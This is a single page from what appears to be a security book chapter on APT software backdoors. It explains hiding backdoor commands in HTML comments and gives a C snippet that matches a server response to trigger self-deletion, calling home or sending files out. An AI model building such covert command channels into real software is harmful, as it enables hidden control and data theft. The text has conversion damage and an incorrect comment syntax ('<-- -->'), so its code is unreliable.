<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1ac" class="pf w2 h2" data-page-no="1ac"><div class="pc pc1ac w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">405</span></div><div class="t m0 x3 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">method, as an html page with only a ve-digit number might appear a little strange </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls1b ws25">to an in<span class="_ _0"/>v<span class="_ _0"/>estigator<span class="_ _0"/>.</div><div class="t m0 x4 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">One of the simplest methods is to hide a single HTML tag inside of a much larger<span class="_ _2"/>, </div><div class="t m0 x3 hd y11f ff4 fs7 fc0 sc0 ls0 ws0">seemingly innocent HTML le. One of the best HTML tags to accomplish this is </div><div class="t m0 x3 hd y120 ff4 fs7 fc0 sc0 ls0 ws0">the HTML comment tag. In HTML, a comment tag works similar to comments in </div><div class="t m0 x3 hd y121 ff4 fs7 fc0 sc0 ls0 ws0">programming languages. Comment tags simply aren’t displayed within the bro<span class="_ _0"/>wser<span class="_ _2"/>. </div><div class="t m0 x3 hd y398 ff4 fs7 fc0 sc0 ls0 ws0">The HTML comment tag is &lt;-- --&gt;, as in the follo<span class="_ _0"/>wing example:</div><div class="t m0 x3 h44 y266a fff fse fc0 sc0 ls0 ws0">&lt;html&gt;</div><div class="t m0 x3 h44 y266b fff fse fc0 sc0 ls0 ws0">&lt;title&gt;Sample Page&lt;/title&gt;</div><div class="t m0 x3 h44 y266c fff fse fc0 sc0 ls0 ws0">&lt;body&gt;</div><div class="t m0 x3 h44 y266d fff fse fc0 sc0 ls0 ws0">&lt;-- This is an HTML comment --&gt;</div><div class="t m0 x3 h44 y266e fff fse fc0 sc0 ls0 ws0">This is the body of the page</div><div class="t m0 x3 h44 y266f fff fse fc0 sc0 ls0 ws0">&lt;/body&gt;</div><div class="t m0 x3 h44 y2670 fff fse fc0 sc0 ls0 ws0">&lt;/html&gt;</div><div class="t m0 x4 hd y2671 ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e can take the same tack as before and congure a comment to mean whatev<span class="_ _0"/>er </div><div class="t m0 x3 hd y2672 ff4 fs7 fc0 sc0 ls0 ws0">we’<span class="_ _2"/>d like and then simply use the c strstr() function to search for the existence of the </div><div class="t m0 x3 hd y2673 ff4 fs7 fc0 sc0 ls0 ws0">command within the html. For e<span class="_ _0"/>xample, using the same code to do<span class="_ _0"/>wnload the le </div><div class="t m0 x3 hd y2674 ff4 fs7 fc0 sc0 ls0 ws0">from the server<span class="_ _2"/>, let’<span class="_ _0"/>s adjust the code used to perform a specic action:</div><div class="t m0 x3 h44 y2675 fff fse fc0 sc0 ls0 ws0">char command1 [] = "&lt;-- 1111 --&gt;&gt;";</div><div class="t m0 x3 h44 y2676 fff fse fc0 sc0 ls0 ws0">char command2 [] = "&lt;--2--&gt;";</div><div class="t m0 x3 h44 y2677 fff fse fc0 sc0 ls0 ws0">char command3 [] = "Like new rascal scooter for sale";</div><div class="t m0 x3 h44 y2678 fff fse fc0 sc0 ls0 ws0">char *ret;</div><div class="t m0 x3 h44 y2679 fff fse fc0 sc0 ls0 ws0">if ( ret = strstr (responseBuf, command1) )</div><div class="t m0 x3 h44 y267a fff fse fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h44 y267b fff fse fc0 sc0 ls0 ws0"> SelfDelete();</div><div class="t m0 x3 h44 y267c fff fse fc0 sc0 ls0 ws0"> ExitProcess(1);</div><div class="t m0 x3 h44 y267d fff fse fc0 sc0 ls0 ws0"> return 1;</div><div class="t m0 x3 h44 y267e fff fse fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h44 y267f fff fse fc0 sc0 ls0 ws0">else if ( ret = strstr (responseBuf, command2) )</div><div class="t m0 x3 h44 y2680 fff fse fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h44 y2681 fff fse fc0 sc0 ls0 ws0"> callHome();</div><div class="t m0 x3 h44 y2682 fff fse fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h44 y2683 fff fse fc0 sc0 ls0 ws0">else if ( ret = strstr (responseBuf, command3) )</div><div class="t m0 x3 h44 y2684 fff fse fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h44 y2685 fff fse fc0 sc0 ls0 ws0"> sendFiles();</div><div class="t m0 x3 h44 y2686 fff fse fc0 sc0 ls0 ws0">}</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>